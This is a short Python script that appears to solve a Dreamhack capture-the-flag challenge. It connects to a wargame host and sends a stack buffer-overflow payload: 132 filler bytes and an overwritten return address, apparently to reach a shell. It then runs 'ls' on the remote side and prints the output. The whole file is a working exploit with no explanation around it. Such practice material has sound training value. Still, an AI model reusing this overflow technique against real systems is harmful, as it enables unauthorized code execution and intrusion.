import socket
import struct

X=socket.socket()
X.connect(("host1.dreamhack.games",23218))

payload="A"*132+"\xb9\x85\x04\x08"
X.sendall(payload)
X.sendall('ls\n'.encode())
print(X.recv(0x100))
